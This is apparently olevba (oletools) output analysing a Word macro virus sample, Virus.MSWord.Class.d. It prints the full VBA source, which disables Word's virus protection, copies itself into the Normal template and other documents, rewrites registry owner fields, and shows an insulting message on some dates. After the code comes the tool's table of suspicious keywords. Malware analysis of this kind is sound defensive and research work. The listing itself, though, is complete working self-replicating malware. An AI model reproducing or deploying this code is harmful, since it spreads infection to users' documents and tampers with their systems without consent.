olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f921ad87b0972b3e6d43b77b1e6b643a54e7bdfc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f921ad87b0972b3e6d43b77b1e6b643a54e7bdfc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'zj00-7-31 9:27:10w97_class_d
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'zj00-7-31 9:27:10w97_class_d
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'zj00-7-31 9:27:10w97_class_d
Const REG_SZ As Long = 1
'zj00-7-31 9:27:10w97_class_d
Const HKEY_CURRENT_USER As Long = &H80000001
'zj00-7-31 9:27:10w97_class_d
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'zj00-7-31 9:27:10w97_class_d
Sub AutoOpen()
'zj00-7-31 9:27:10w97_class_d
On Error GoTo out
'zj00-7-31 9:27:10w97_class_d
Options.VirusProtection = False
'zj00-7-31 9:27:10w97_class_d
Options.SaveNormalPrompt = False
'zj00-7-31 9:27:10w97_class_d
Options.ConfirmConversions = False
'zj00-7-31 9:27:10w97_class_d
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'zj00-7-31 9:27:10w97_class_d
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'zj00-7-31 9:27:10w97_class_d
If nt > 70 And ad > 0 Then GoTo out
'zj00-7-31 9:27:10w97_class_d
If nt < 70 Then
'zj00-7-31 9:27:10w97_class_d
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'zj00-7-31 9:27:10w97_class_d
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'zj00-7-31 9:27:10w97_class_d
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'zj00-7-31 9:27:10w97_class_d
End If
'zj00-7-31 9:27:10w97_class_d
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'zj00-7-31 9:27:10w97_class_d
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'zj00-7-31 9:27:10w97_class_d
host.codemodule.AddFromFile ("c:\class.sys")
'zj00-7-31 9:27:10w97_class_d
With host.codemodule
'zj00-7-31 9:27:10w97_class_d
    For x = 1 To 16
'zj00-7-31 9:27:10w97_class_d
    .deletelines 1
'zj00-7-31 9:27:10w97_class_d
    Next x
'zj00-7-31 9:27:10w97_class_d
End With
'zj00-7-31 9:27:10w97_class_d
If nt < 70 Then
'zj00-7-31 9:27:10w97_class_d
    With host.codemodule
'zj00-7-31 9:27:10w97_class_d
    .replaceline 1, "Sub AutoClose()"
'zj00-7-31 9:27:10w97_class_d
    .replaceline 91, "Sub ToolsMacro()"
'zj00-7-31 9:27:10w97_class_d
    For x = 70 To 81
'zj00-7-31 9:27:10w97_class_d
        .deletelines 62
'zj00-7-31 9:27:10w97_class_d
    Next x
'zj00-7-31 9:27:10w97_class_d
    .replaceline 35, "    For x = 1 To 4"
'zj00-7-31 9:27:10w97_class_d
    End With
'zj00-7-31 9:27:10w97_class_d
End If
'zj00-7-31 9:27:10w97_class_d
If nt < 70 Then
'zj00-7-31 9:27:10w97_class_d
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'zj00-7-31 9:27:10w97_class_d
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'zj00-7-31 9:27:10w97_class_d
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'zj00-7-31 9:27:10w97_class_d
u = RegCloseKey(k)
'zj00-7-31 9:27:10w97_class_d
End If
'zj00-7-31 9:27:10w97_class_d
With host.codemodule
'zj00-7-31 9:27:10w97_class_d
    For x = 2 To 104 Step 2
'zj00-7-31 9:27:10w97_class_d
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'zj00-7-31 9:27:10w97_class_d
    Next x
'zj00-7-31 9:27:10w97_class_d
End With
'zj00-7-31 9:27:10w97_class_d
out:
'zj00-7-31 9:27:10w97_class_d
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'zj00-7-31 9:27:10w97_class_d
End Sub
'zj00-7-31 9:27:10w97_class_d
Sub ViewVBCode()
'zj00-7-31 9:27:10w97_class_d
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
